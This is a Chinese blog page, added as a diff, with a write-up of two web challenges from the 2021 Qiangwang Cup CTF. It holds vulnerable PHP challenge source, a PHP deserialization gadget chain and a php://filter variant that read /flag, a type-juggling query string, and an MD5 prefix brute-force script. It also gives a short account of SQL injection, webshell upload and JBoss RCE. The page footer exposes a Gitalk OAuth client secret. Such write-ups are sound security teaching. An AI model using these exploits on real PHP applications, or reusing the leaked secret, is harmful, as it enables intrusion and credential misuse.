@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[CTF] 2021强网杯 WEB部分Write Up | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="学院实验室的小伙伴想参加强网杯，我就顺带着报了个名，之前学了一点代码审计相关的知识，做了两道代码审计题目。
+[强网先锋]赌徒
+源码：
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;?php
+//hin..." />
+    <meta name="keywords" content="信息安全,代码审计" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[CTF] 2021强网杯 WEB部分Write Up</h2>
+            <div class="post-date">2021-09-22</div>
+            
+            <div class="post-content" v-pre>
+              <p>学院实验室的小伙伴想参加强网杯，我就顺带着报了个名，之前学了一点代码审计相关的知识，做了两道代码审计题目。</p>
+<h2 id="强网先锋赌徒">[强网先锋]赌徒</h2>
+<p>源码：</p>
+<pre><code class="language-html">&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;?php
+//hint is in hint.php
+error_reporting(1);
+
+
+class Start
+{
+    public $name='guest';
+    public $flag='syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);';
+	
+    public function __construct(){
+        echo &quot;I think you need /etc/hint . Before this you need to see the source code&quot;;
+    }
+
+    public function _sayhello(){
+        echo $this-&gt;name;
+        return 'ok';
+    }
+
+    public function __wakeup(){
+        echo &quot;hi&quot;;
+        $this-&gt;_sayhello();
+    }
+    public function __get($cc){
+        echo &quot;give you flag : &quot;.$this-&gt;flag;
+        return ;
+    }
+}
+
+class Info
+{
+    private $phonenumber=123123;
+    public $promise='I do';
+	
+    public function __construct(){
+        $this-&gt;promise='I will not !!!!';
+        return $this-&gt;promise;
+    }
+
+    public function __toString(){
+        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];
+    }
+}
+
+class Room
+{
+    public $filename='/flag';
+    public $sth_to_set;
+    public $a='';
+	
+    public function __get($name){
+        $function = $this-&gt;a;
+        return $function();
+    }
+	
+    public function Get_hint($file){
+        $hint=base64_encode(file_get_contents($file));
+        echo $hint;
+        return ;
+    }
+
+    public function __invoke(){
+        $content = $this-&gt;Get_hint($this-&gt;filename);
+        echo $content;
+    }
+}
+
+if(isset($_GET['hello'])){
+    unserialize($_GET['hello']);
+}else{
+    $hi = new  Start();
+}
+
+?&gt;
+</code></pre>
+<p>Room 里可以读取文件并输出，但是需要以调用函数的方式调用这个对象。正好里面的 __get() 方法当调用对象中不存在的属性或者私有的属性的时候就能触发调用他自己。</p>
+<p>再看 Info 对象里的 __toString 就可以调用一个 Room 里不存在的对象 ffiillee['ffiilleennaammee']。</p>
+<p>为了实现输出 Info，看到 Start 里反序列化的时候会调用 _sayhello() 方法。</p>
+<p>于是让 Start-&gt;name 指向 Info，Info-&gt;file['filename'] 指向 Room，然后以调用函数的方式调用 Room，Room-&gt;filename = '/flag' 就能输出 flag 了。</p>
+<p>Exp</p>
+<pre><code class="language-php">class Start
+{
+    public $name;
+}
+class Info{}
+class Room
+{
+    public $filename='/flagxxxxxx';
+}
+$a = new Start();
+$b = new Info();
+$c = new Room();
+$a-&gt;name = $b;
+$b-&gt;file['filename'] = $c;
+$c-&gt;a = $c;
+
+echo urlencode(serialize($a));
+</code></pre>
+<p>优秀学弟的Exp，感觉比我的优雅😂</p>
+<pre><code class="language-php">$a=new Start();
+$a-&gt;name=new Info();
+$a-&gt;name-&gt;file['filename']=new Room();
+$a-&gt;name-&gt;file['filename']-&gt;a=new Room();
+$a-&gt;name-&gt;file['filename']-&gt;a-&gt;filename='php://filter/read=convert.base64-encode/resource=/flag';
+echo(serialize($a));
+</code></pre>
+<h2 id="强网先锋寻宝">[强网先锋]寻宝</h2>
+<p>源代码</p>
+<pre><code class="language-php">&lt;?php
+header('Content-type:text/html;charset=utf-8');
+error_reporting(0);
+highlight_file(__file__);
+function filter($string){
+        $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\$','\(','\.','num','html','\/','\,','\'','0000000');
+        $filter_phrase= '/'.implode('|',$filter_word).'/';
+        return preg_replace($filter_phrase,'',$string);
+    }
+if($ppp){
+    unset($ppp);
+}
+$ppp['number1'] = &quot;1&quot;;
+$ppp['number2'] = &quot;1&quot;;
+$ppp['nunber3'] = &quot;1&quot;;
+$ppp['number4'] = '1';
+$ppp['number5'] = '1';
+extract($_POST);
+$num1 = filter($ppp['number1']);        
+$num2 = filter($ppp['number2']);        
+$num3 = filter($ppp['number3']);        
+$num4 = filter($ppp['number4']);
+$num5 = filter($ppp['number5']);    
+if(isset($num1) &amp;&amp; is_numeric($num1)){
+    die(&quot;非数字&quot;);
+}
+else{
+  
+    if($num1 &gt; 1024){
+    echo &quot;第一层&quot;;
+        if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){
+            echo &quot;第二层&quot;;
+            if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){
+                echo &quot;第三层&quot;;
+                if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){
+                    echo &quot;第四层&quot;;
+                    if(!isset($num5)||(strlen($num5)==0)) die(&quot;no&quot;);
+                    $b=json_decode(@$num5);
+                        if($y = $b === NULL){
+                                if($y === true){
+                                    echo &quot;第五层&quot;;
+                                    include 'KeY1lhv.php';
+                                    echo $KEY1;
+                                }
+                        }else{
+                            die(&quot;no&quot;);
+                        }
+                }else{
+                    die(&quot;no&quot;);
+                }
+            }else{
+                die(&quot;no&quot;);
+            }
+        }else{
+            die(&quot;no&quot;);
+        }
+    }else{
+        die(&quot;no111&quot;);
+    }
+}
+</code></pre>
+<p>Exp:<br>
+<code>flag.php?ppp[number1]=10255www&amp;ppp[number2]=99e9&amp;ppp[number4]=0000asa&amp;ppp[number5]=null&amp;ppp[number3]=lET1TUtER7xa2tthOmR6</code><br>
+第一个弱类型比较不多说，第二个科学计数法，第三个爆破脚本在下面加上，第四个同样是弱类型，第五个===优先于赋值。</p>
+<pre><code class="language-python">
+# -*- coding: utf-8 -*-
+
+import multiprocessing
+import hashlib
+import random
+import string
+import sys
+
+
+CHARS = string.letters + string.digits
+
+
+def cmp_md5(substr, stop_event, str_len, start=0, size=20):
+    global CHARS
+
+    while not stop_event.is_set():
+        rnds = ''.join(random.choice(CHARS) for _ in range(size))
+        md5 = hashlib.md5(rnds)
+
+        if md5.hexdigest()[start: start+str_len] == substr:
+            print rnds
+            stop_event.set()
+
+
+if __name__ == '__main__':
+    substr = sys.argv[1].strip()
+
+    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0
+
+    str_len = len(substr)
+    cpus = multiprocessing.cpu_count()
+    stop_event = multiprocessing.Event()
+    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
+                                         stop_event, str_len, start_pos))
+                 for i in range(cpus)]
+
+    for p in processes:
+        p.start()
+
+    for p in processes:
+        p.join()
+</code></pre>
+<p>最后还有一道Easy WEB，当时没有做出来，当时是从前台sql注入获取到了管理员账号密码，然后扫目录发现上传点，通过无字母的PHP马子绕过过滤上传Get Shell，web目录下有一个flag文件但是没有权限读取，当时到这里就不知道怎么办了，后面比赛结束看了其他人的write up才知道是通过扫描端口，用jboss完成第二次的RCE提权去读取flag，当时也确实探测到了jboss端口的开放，奈何之前没有学习过jboss，就差一点点/(ㄒoㄒ)/~~。</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
+                    信息安全
+                  </a>
+                
+                  <a href="https://0xwi11.github.io/tag/XSg-eSjSDb/" class="tag">
+                    代码审计
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/vulnstack-1/">
+                  <h3 class="post-title">
+                    内网渗透靶机-VulnStack 1
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
